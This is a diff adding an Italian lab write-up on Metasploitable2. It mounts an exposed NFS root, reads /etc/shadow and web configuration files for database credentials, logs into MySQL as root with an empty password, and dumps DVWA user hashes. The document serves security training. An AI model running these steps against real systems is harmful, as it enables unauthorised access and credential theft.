@@ -1162,11 +1162,512 @@ Il payload corretto può fare la differenza tra exploit fallito e sessione funzi
 
 ---
 
+## NFS File Hunting and MySQL Credential Disclosure
+
+Durante la service enumeration sono stati identificati i servizi RPC/NFS:
+
+```text
+111/tcp  open  rpcbind
+2049/tcp open  nfs
+```
+
+L’obiettivo era verificare se il target esportava directory tramite NFS e se fosse possibile leggere file sensibili o configurazioni applicative.
+
+---
+
+## Enumerazione NFS
+
+Comando usato:
+
+```bash
+showmount -e 192.168.1.100
+```
+
+Risultato:
+
+```text
+Export list for 192.168.1.100:
+/ *
+```
+
+Interpretazione:
+
+```text
+Il target esporta la root del filesystem (/).
+Il simbolo * indica che l’export è accessibile da qualsiasi host autorizzato nella rete di laboratorio.
+Questa è una misconfigurazione critica.
+```
+
+---
+
+## Mount della share NFS
+
+Creazione directory locale su Kali:
+
+```bash
+mkdir -p ~/nfs-mount
+```
+
+Mount dell’export NFS:
+
+```bash
+sudo mount -t nfs 192.168.1.100:/ ~/nfs-mount -o nolock
+```
+
+Accesso alla directory montata:
+
+```bash
+cd ~/nfs-mount
+ls -la
+```
+
+Risultato importante:
+
+```text
+bin
+boot
+etc
+home
+root
+tmp
+usr
+var
+```
+
+Interpretazione:
+
+```text
+Il mount NFS ha esposto l’intero filesystem del target.
+Da Kali è stato possibile navigare directory sensibili del sistema remoto.
+```
+
+---
+
+## Lettura utenti locali
+
+Comando:
+
+```bash
+cat ~/nfs-mount/etc/passwd
+```
+
+Utenti interessanti identificati:
+
+```text
+root
+msfadmin
+user
+service
+postgres
+mysql
+tomcat55
+www-data
+daemon
+```
+
+Interpretazione:
+
+```text
+/etc/passwd permette di enumerare utenti locali, home directory e shell configurate.
+```
+
+---
+
+## Lettura file shadow
+
+Comando:
+
+```bash
+sudo cat ~/nfs-mount/etc/shadow | head
+```
+
+Risultato esempio:
+
+```text
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+```
+
+Interpretazione:
+
+```text
+/etc/shadow contiene hash delle password degli utenti Linux.
+La possibilità di leggere questo file tramite NFS conferma una misconfigurazione grave.
+```
+
+Nota:
+
+```text
+Gli hash non sono password in chiaro.
+Possono però essere salvati e analizzati in laboratorio con strumenti come John o Hashcat.
+```
+
+---
+
+## Enumerazione directory home
+
+Comandi:
+
+```bash
+ls -la ~/nfs-mount/home
+ls -la ~/nfs-mount/home/msfadmin
+ls -la ~/nfs-mount/home/user
+ls -la ~/nfs-mount/home/service
+```
+
+Risultati importanti:
+
+```text
+/home/msfadmin
+/home/user
+/home/service
+```
+
+File e directory interessanti trovati in `/home/msfadmin`:
+
+```text
+.distcc
+.mysql_history
+.rhosts
+.ssh
+.sudo_as_admin_successful
+vulnerable
+```
+
+Interpretazione:
+
+```text
+Le home directory possono contenere cronologie, chiavi SSH, file .rhosts, configurazioni e altri indizi utili.
+```
+
+---
+
+## Enumerazione web root
+
+Comando:
+
+```bash
+ls -la ~/nfs-mount/var/www
+```
+
+Risultati importanti:
+
+```text
+/var/www/dav
+/var/www/dvwa
+/var/www/mutillidae
+/var/www/phpMyAdmin
+/var/www/phpinfo.php
+/var/www/tikiwiki
+/var/www/tikiwiki-old
+/var/www/twiki
+```
+
+Interpretazione:
+
+```text
+Il filesystem NFS espone le applicazioni web installate sul target.
+Questo permette credential hunting nei file di configurazione PHP.
+```
+
+---
+
+## Ricerca file di configurazione
+
+Comando:
+
+```bash
+find ~/nfs-mount/var/www -type f -iname "*config*" 2>/dev/null
+```
+
+Risultati importanti:
+
+```text
+/root/nfs-mount/var/www/dvwa/config/config.inc.php
+/root/nfs-mount/var/www/dvwa/config/config.inc.php~
+/root/nfs-mount/var/www/mutillidae/config.inc
+/root/nfs-mount/var/www/phpMyAdmin/config.sample.inc.php
+```
+
+Interpretazione:
+
+```text
+Sono stati trovati file di configurazione di applicazioni web.
+Questi file possono contenere credenziali database.
+```
+
+---
+
+## Credential hunting nei file web
+
+Comando:
+
+```bash
+grep -Rni "db_password\|db_user\|username\|passwd" ~/nfs-mount/var/www 2>/dev/null | head -50
+```
+
+Risultati importanti su DVWA:
+
+```text
+/root/nfs-mount/var/www/dvwa/config/config.inc.php:17:$_DVWA[ 'db_user' ] = 'root';
+/root/nfs-mount/var/www/dvwa/config/config.inc.php:18:$_DVWA[ 'db_password' ] = '';
+```
+
+Interpretazione:
+
+```text
+DVWA usa l’utente database root con password vuota.
+```
+
+---
+
+## Lettura configurazione Mutillidae
+
+Comando:
+
+```bash
+cat ~/nfs-mount/var/www/mutillidae/config.inc
+```
+
+Risultato:
+
+```php
+<?php
+        /* NOTE: On Samurai, the $dbpass password is "samurai" rather than blank */
+
+        $dbhost = 'localhost';
+        $dbuser = 'root';
+        $dbpass = '';
+        $dbname = 'metasploit';
+?>
+```
+
+Interpretazione:
+
+```text
+Mutillidae usa:
+Database host: localhost
+Database user: root
+Database password: vuota
+Database name: metasploit
+```
+
+---
+
+## Accesso MySQL remoto
+
+Da Nmap era stato identificato MySQL:
+
+```text
+3306/tcp open mysql MySQL 5.0.51a-3ubuntu5
+```
+
+Primo tentativo:
+
+```bash
+mysql -h 192.168.1.100 -u root
+```
+
+Errore:
+
+```text
+ERROR 2026 (HY000): TLS/SSL error: wrong version number
+```
+
+Interpretazione:
+
+```text
+Il client MySQL moderno di Kali tenta una negoziazione TLS/SSL non compatibile con il vecchio MySQL del target.
+Non significa password errata.
+```
+
+Comando corretto:
+
+```bash
+mysql -h 192.168.1.100 -u root --ssl=0
+```
+
+Risultato:
+
+```text
+Welcome to the MariaDB monitor.
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+```
+
+Interpretazione:
+
+```text
+Accesso MySQL remoto riuscito con utente root e password vuota.
+L’opzione --ssl=0 ha disabilitato SSL/TLS lato client.
+```
+
+---
+
+## Enumerazione database
+
+Comando:
+
+```sql
+show databases;
+```
+
+Risultato:
+
+```text
+information_schema
+dvwa
+metasploit
+mysql
+owasp10
+tikiwiki
+tikiwiki195
+```
+
+Interpretazione:
+
+```text
+Sono presenti diversi database applicativi.
+```
+
+---
+
+## Enumerazione database DVWA
+
+Comandi:
+
+```sql
+use dvwa;
+show tables;
+```
+
+Risultato:
+
+```text
+guestbook
+users
+```
+
+Lettura tabella utenti:
+
+```sql
+select * from users;
+```
+
+Risultato:
+
+```text
+admin   | 5f4dcc3b5aa765d61d8327deb882cf99
+gordonb | e99a18c428cb38d5f260853678922e03
+1337    | 8d3533d75ae2c3966d7e0d4fcc69216b
+pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7
+smithy  | 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+Interpretazione:
+
+```text
+Sono stati estratti utenti applicativi DVWA e relativi hash password.
+Gli hash sembrano MD5.
+```
+
+Nota:
+
+```text
+5f4dcc3b5aa765d61d8327deb882cf99 corrisponde alla password "password".
+```
+
+Credenziali applicative probabili:
+
+```text
+admin / password
+smithy / password
+```
+
+---
+
+## Enumerazione utenti MySQL
+
+Comando:
+
+```sql
+select user, host, password from mysql.user;
+```
+
+Risultato:
+
+```text
+debian-sys-maint |      | 
+root             | %    | 
+guest            | %    |
+```
+
+Interpretazione:
+
+```text
+L’utente MySQL root accetta connessioni da host remoti (%) con password vuota.
+Questa è una misconfigurazione critica del database.
+```
+
+---
+
+## Catena completa
+
+```text
+Nmap trova RPC/NFS e MySQL
+↓
+showmount -e 192.168.1.100
+↓
+Export / *
+↓
+mount NFS su Kali
+↓
+lettura filesystem target
+↓
+lettura /etc/passwd e /etc/shadow
+↓
+enumerazione /var/www
+↓
+ricerca file config
+↓
+lettura DVWA config e Mutillidae config
+↓
+db_user = root
+↓
+db_password = vuota
+↓
+mysql -h 192.168.1.100 -u root --ssl=0
+↓
+show databases
+↓
+use dvwa
+↓
+select * from users
+↓
+estrazione utenti e hash applicativi
+```
+
+---
+
+## Lezioni apprese
+
+```text
+NFS mal configurato può esporre l’intero filesystem del target.
+La lettura di /etc/shadow tramite NFS è un finding critico.
+I file di configurazione web possono contenere credenziali database.
+Le credenziali trovate nei file possono essere riutilizzate su servizi esposti.
+MySQL vecchio può richiedere --ssl=0 con client moderni.
+Gli hash applicativi devono essere identificati e documentati, non confusi con password in chiaro.
+```
+
+---
+
 ## Nota etica
 
 Questo test è stato svolto esclusivamente su Metasploitable2, macchina vulnerabile progettata per laboratori locali autorizzati.
 
 Non utilizzare questi comandi contro sistemi reali senza autorizzazione esplicita.
+
 
 
 
